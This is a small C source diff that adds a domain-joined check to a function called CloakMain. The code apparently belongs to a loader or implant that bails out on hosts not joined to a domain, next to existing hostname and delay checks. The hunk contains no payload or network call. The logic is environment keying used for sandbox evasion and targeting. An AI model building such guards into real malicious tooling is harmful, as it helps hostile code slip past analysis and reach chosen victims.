@@ -33,6 +33,16 @@ int CloakMain(PVOID Reserved) {
     }
     #endif // !CHECK_HOSTNAME
 
+    #ifdef CHECK_DOMAIN_JOINED
+    if ( ! CheckDomainJoined() ) {
+        #ifdef DEBUG
+        printf( "[-] Target Not Domain Joined\n");
+        #endif // !DEBUG
+        
+        return 0;
+    }
+    #endif // !CHECK_DOMAIN_JOINED
+
     #ifdef DELAY
     DWORD t0 = GetTickCount64();
 
